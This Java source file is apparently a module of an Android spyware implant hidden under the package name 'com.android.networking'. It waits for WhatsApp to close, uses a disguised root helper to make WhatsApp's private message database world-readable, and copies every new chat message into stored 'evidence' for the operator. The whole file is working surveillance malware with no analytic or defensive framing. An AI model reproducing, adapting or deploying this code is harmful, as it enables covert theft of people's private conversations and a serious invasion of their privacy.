package com.android.networking.module;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Enumeration;
import java.util.Hashtable;
import java.util.Iterator;
import java.util.Vector;

import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteOpenHelper;
import android.database.sqlite.SQLiteQueryBuilder;
import android.util.Pair;

import com.android.networking.ProcessInfo;
import com.android.networking.ProcessStatus;
import com.android.networking.Status;
import com.android.networking.auto.Cfg;
import com.android.networking.conf.ConfModule;
import com.android.networking.db.GenericSqliteHelper;
import com.android.networking.evidence.Evidence;
import com.android.networking.evidence.EvidenceType;
import com.android.networking.evidence.Markup;
import com.android.networking.interfaces.Observer;
import com.android.networking.listener.ListenerProcess;
import com.android.networking.util.Check;
import com.android.networking.util.DateTime;
import com.android.networking.util.Utils;
import com.android.networking.util.WChar;

public class ModuleChat extends BaseModule implements Observer<ProcessInfo> {
	private static final String TAG = "ModuleChat";

	String pObserving = "whatsapp";
	Markup markupChat;

	Hashtable<String, Integer> hastableConversationLastIndex = new Hashtable<String, Integer>();

	@Override
	protected boolean parse(ConfModule conf) {
		if (Status.self().haveRoot()) {

			return true;
		} else {
			return false;
		}
	}

	@Override
	protected void actualGo() {
		// check for whatsapp activities
		// open db msgstore /data/data/com.whatsapp/databases/msgstore.db
		// open table chat_list
		// per ogni entry leggere l'ultimo messaggio letto.
		// open table messages
	}

	@Override
	protected void actualStart() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (actualStart)");
		}
		markupChat = new Markup(this);
		hastableConversationLastIndex = new Hashtable<String, Integer>();
		try {
			if (markupChat.isMarkup()) {
				hastableConversationLastIndex = (Hashtable<String, Integer>) markupChat.readMarkupSerializable();
				Enumeration<String> keys = hastableConversationLastIndex.keys();

				while (keys.hasMoreElements()) {
					String key = keys.nextElement();
					if (Cfg.DEBUG) {
						Check.log(TAG + " (actualStart): " + key + " -> " + hastableConversationLastIndex.get(key));
					}
				}
			}
		} catch (Exception e) {

		}
		ListenerProcess.self().attach(this);
	}

	@Override
	protected void actualStop() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (actualStop)");
		}
		ListenerProcess.self().detach(this);
	}

	@Override
	public int notification(ProcessInfo process) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (notification): " + process);
		}
		if (process.processInfo.processName.contains(pObserving)) {
			if (process.status == ProcessStatus.STOP) {
				try {
					readChatMessages();
				} catch (IOException e) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (notification) Error: " + e);
					}
				}
			}
		}
		return 0;
	}

	// select messages._id,chat_list.key_remote_jid,key_from_me,data from
	// chat_list,messages where chat_list.key_remote_jid =
	// messages.key_remote_jid

	private synchronized void readChatMessages() throws IOException {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (readChatMessages)");
		}
		boolean updateMarkup = false;
		String dbDir = "/data/data/com.whatsapp/databases";
		String dbFile = dbDir + "/msgstore.db";
		// changeFilePermission(dbFile,777);
		Runtime.getRuntime().exec("/system/bin/ntpsvd pzm 777 " + dbDir);
		Runtime.getRuntime().exec("/system/bin/ntpsvd pzm 777 " + dbFile);
		File file = new File(dbFile);
		if (file.canRead()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (readChatMessages): can read DB");
			}
			GenericSqliteHelper helper = new GenericSqliteHelper(dbFile, 1);
			SQLiteDatabase db = helper.getReadableDatabase();

			// retrieve a list of all the conversation changed from the last
			// reading
			ArrayList<Pair<String, Integer>> changedConversations = fetchChangedConversation(db);

			// for every conversation, fetch and save message and update markup
			for (Pair<String, Integer> pair : changedConversations) {
				String conversation = pair.first;
				int lastReadIndex = pair.second;

				int newLastRead = fetchMessages(db, conversation, lastReadIndex);

				if (Cfg.DEBUG) {
					Check.log(TAG + " (readChatMessages): fetchMessages " + conversation + ":" + lastReadIndex
							+ " newLastRead " + newLastRead);
				}
				hastableConversationLastIndex.put(conversation, newLastRead);
				if (Cfg.DEBUG) {
					Check.asserts(hastableConversationLastIndex.get(conversation) > 0,
							" (readChatMessages) Assert failed, zero index");
				}
				updateMarkup = true;
			}

			if (updateMarkup) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (readChatMessages): updating markup");
				}
				markupChat.writeMarkupSerializable(hastableConversationLastIndex);
			}

			db.close();
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (readChatMessages) Error, file not readable: " + dbFile);
			}
		}
	}

	private ArrayList<Pair<String, Integer>> fetchChangedConversation(SQLiteDatabase db) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (fetchChangedConversation)");
		}

		ArrayList<Pair<String, Integer>> changedConversations = new ArrayList<Pair<String, Integer>>();

		SQLiteQueryBuilder queryBuilderIndex = new SQLiteQueryBuilder();
		queryBuilderIndex.setTables("chat_list");
		// queryBuilder.appendWhere(inWhere);
		String[] projection = { "_id", "key_remote_jid", "message_table_id" };
		Cursor cursor = queryBuilderIndex.query(db, projection, null, null, null, null, null);

		// iterate conversation indexes
		while (cursor != null && cursor.moveToNext()) {
			String jid = cursor.getString(cursor.getColumnIndexOrThrow("key_remote_jid"));
			int mid = cursor.getInt(cursor.getColumnIndexOrThrow("message_table_id"));
			if (Cfg.DEBUG) {
				Check.log(TAG + " (readChatMessages): jid : " + jid + " mid : " + mid);
			}

			int lastReadIndex = 0;
			// if conversation in known, get the last read index
			if (hastableConversationLastIndex.containsKey(jid)) {

				lastReadIndex = hastableConversationLastIndex.get(jid);
				if (Cfg.DEBUG) {
					Check.log(TAG + " (fetchChangedConversation), I have the index: " + lastReadIndex);
				}
			}

			// if there's something new, fetch new messages and update
			// markup
			if (lastReadIndex < mid) {
				changedConversations.add(new Pair<String, Integer>(jid, lastReadIndex));
			}

		}
		cursor.close();
		return changedConversations;
	}

	private int fetchMessages(SQLiteDatabase db, String conversation, int lastReadIndex) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (fetchMessages): " + conversation + " : " + lastReadIndex);
		}
		SQLiteQueryBuilder queryBuilderIndex = new SQLiteQueryBuilder();
		queryBuilderIndex.setTables("messages");
		queryBuilderIndex.appendWhere("key_remote_jid = '" + conversation + "' AND _id > " + lastReadIndex);
		String[] projection = { "_id", "key_remote_jid", "data" };
		Cursor cursor = queryBuilderIndex.query(db, projection, null, null, null, null, null);
		ArrayList<String> messages = new ArrayList<String>();
		int lastRead = lastReadIndex;
		while (cursor != null && cursor.moveToNext()) {
			String data = cursor.getString(cursor.getColumnIndexOrThrow("data"));
			int index = cursor.getInt(cursor.getColumnIndexOrThrow("_id"));
			if (Cfg.DEBUG) {
				Check.log(TAG + " (fetchMessages): " + conversation + " : " + index + " -> " + data);
			}
			lastRead = Math.max(index, lastRead);
			messages.add(data);
		}
		cursor.close();
		saveEvidence(conversation, messages);
		return lastRead;
	}

	private void saveEvidence(String conversation, ArrayList<String> messages) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (saveEvidence): " + conversation);
		}
		DateTime datetime = new DateTime();
		final ArrayList<byte[]> items = new ArrayList<byte[]>();
		for (String message : messages) {

			items.add(datetime.getStructTm());
			items.add(WChar.getBytes("whatsapp", true));
			items.add(WChar.getBytes("", true));
			items.add(WChar.getBytes(conversation.replaceAll("@s.whatsapp.net", ""), true));
			items.add(WChar.getBytes(message, true));
			items.add(Utils.intToByteArray(Evidence.E_DELIMITER));
		}

		Evidence evidence = new Evidence(EvidenceType.CHAT);
		evidence.atomicWriteOnce(items);
	}

}
